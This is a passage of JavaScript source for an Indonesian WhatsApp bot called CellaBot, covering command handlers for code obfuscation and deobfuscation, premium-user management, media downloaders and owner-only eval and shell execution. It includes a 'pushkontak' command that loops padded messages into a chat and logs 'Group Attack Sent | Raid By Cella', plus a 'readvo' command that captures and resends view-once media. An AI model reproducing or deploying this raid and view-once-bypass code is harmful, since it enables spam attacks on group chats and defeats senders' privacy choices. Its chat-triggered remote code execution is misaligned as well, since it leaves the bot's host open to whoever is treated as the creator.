            return input.replace(
                /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
            );
        }

        // Fungsi untuk menghasilkan string acak
        function randomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
            const charactersLength = characters.length;

            for (let i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        return removeUnwantedChars(originalString) + randomString(2);
    },

   renameVariables: true,
    renameGlobals: true,

    stringEncoding: true,
    stringSplitting: 0.0,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,

    shuffle: {
        hash: 0.0,
        true: 0.0
    },

    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 0.9,
    deadCode: 0.0,
    dispatcher: true,
    rgf: false,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true 
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await CellaBot.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
}
break
 case 'dec': case 'decrypt': {
const { webcrack } = await import('webcrack');
const usage = `Contoh:
${command} (Input text or reply text to dec code)
${command} doc (Reply to a document)`;

if (!isPrem) return m.reply('Khusus Premium');

let text;
if (args.length >= 1) {
text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
text = m.quoted.text;
} else {
return m.reply(usage);
}

try {
let message;
if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;
if (m.quoted.mimetype) {
docBuffer = await m.quoted.download();
}
message = await webcrack(docBuffer.toString('utf-8'));
} else {
message = await webcrack(text);
}

const filePath = './@sampah_decrypt_Cella';
fs.writeFileSync(filePath, message.code);
await CellaBot.sendMessage(m.chat, {
document: {
url: filePath
},
mimetype: 'application/javascript',
fileName: 'Dec By © Cella.js'
}, {quoted: m});

} catch (error) {
const errorMessage = `Terjadi kesalahan: ${error.message}`;
await m.reply(errorMessage);
}
}
break

case 'addprem': {

if (!isCreator) return m.reply('Khusus developer')
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return m.reply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return m.reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Sukses')
} else {
var cekap = await CellaBot.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return m.reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Sukses')
}}
break
case 'readvo': case 'rvo': {
if (!isPrem) return m.reply('Reply viewonce')
let type = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[type]
let media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await CellaBot.sendMessage(m.chat, { video: buffer, caption: quotedType.caption })
} else if (/image/.test(type)) {
await CellaBot.sendMessage(m.chat, { image: buffer, caption: quotedType.caption })
}
}
break

case  'pin': {
  if (!text) return reply(`example: .pin cela toki`);
  await reply("Mohon tunggu kak");

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: CellaBot.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res);
  let ult = res.splice(0, 10); 
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: global.namabot
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  let bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: "Done"
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `Search: ${text} | Nama: ${pushname}`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await CellaBot.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
        break
case 'pushkontak': {
	if (!isPrem) return m.reply(` Khusus Prem `)
	async function KamoFlasZ(zLoc, ptcp, participant) {
CellaBot.sendMessage(
chat,
{
text: "Memproses Mengirim Pesan Ke\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n "
},
{ quoted: { ...nullgb, key: { ...nullgb.key, participant } } }
);
}
async function KamoFlasX() {
if (!args[0]) amount = `99`;
for (let i = 1; i < 10; i++) {
KamoFlasZ(pushname, m.chat, m.sender);

}
}
	await KamoFlasX();
}
              console.log(chalk.green("Group Attack Sent | Raid By Cella"));
break
case 'play':
    if (!args.length) {
        await CellaBot.sendMessage(m.chat, { text: 'Masukkan judul lagu atau video. Contoh: /play Despacito' }, { quoted: m });
        break;
    }

    const searchText = args.join(' ');
    await CellaBot.sendMessage(m.chat, { text: 'Mencari video di YouTube...' }, { quoted: m });

    try {
        const results = await yts(searchText);

        if (!results.videos.length) {
            await CellaBot.sendMessage(m.chat, { text: 'Video tidak ditemukan.' }, { quoted: m });
            break;
        }

        const video = results.videos[0];
        const response = await fetch(`https://api.siputzx.my.id/api/d/ytmp3?url=${video.url}`);
        const audioData = await response.json();

        if (audioData.status && audioData.data.dl) {
            await CellaBot.sendMessage(m.chat, {
                image: { url: video.thumbnail },
                caption: `🎶 *Title*: ${video.title}\n👀 *Views*: ${video.views}\n⏱ *Duration*: ${video.timestamp}\n📅 *Uploaded*: ${video.ago}\n🔗 *URL*: ${video.url}`,
            }, { quoted: m });

            await CellaBot.sendMessage(m.chat, {
                audio: { url: audioData.data.dl },
                mimetype: 'audio/mp4',
            }, { quoted: m });
        } else {
            await CellaBot.sendMessage(m.chat, { text: 'Gagal mendownload audio.' }, { quoted: m });
        }
    } catch (error) {
        await CellaBot.sendMessage(m.chat, { text: 'Terjadi kesalahan. Coba lagi nanti.' }, { quoted: m });
    }
    break;
case 'tiktok': {
  try {
    if (!text) return reply("Silakan masukkan URL TikTok. Contoh: .tiktok <url>");

    const result = await tiktok(text.trim());

    const caption = `🎥 *TikTok Downloader*\n\n📄 Judul: ${result.title}\n🔗 Link tanpa watermark: ${result.no_watermark}\n🔗 Link dengan watermark: ${result.watermark}\n🎵 Musik: ${result.music}`;

    // Kirim gambar thumbnail
    await CellaBot.sendMessage(m.chat, {
      image: { url: result.cover },
      caption,
    });

    // Kirim video tanpa watermark
    await CellaBot.sendMessage(m.chat, {
      video: { url: result.no_watermark },
      caption: `🎥 Video tanpa watermark dari TikTok.`,
    });
  } catch (error) {
    console.error(error);
    reply("Maaf, terjadi kesalahan saat memproses video TikTok.");
  }
}
break;



default:
   
    
                
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
	require('fs').unwatchFile(file)
	console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
	delete require.cache[file]
	require(file)
})

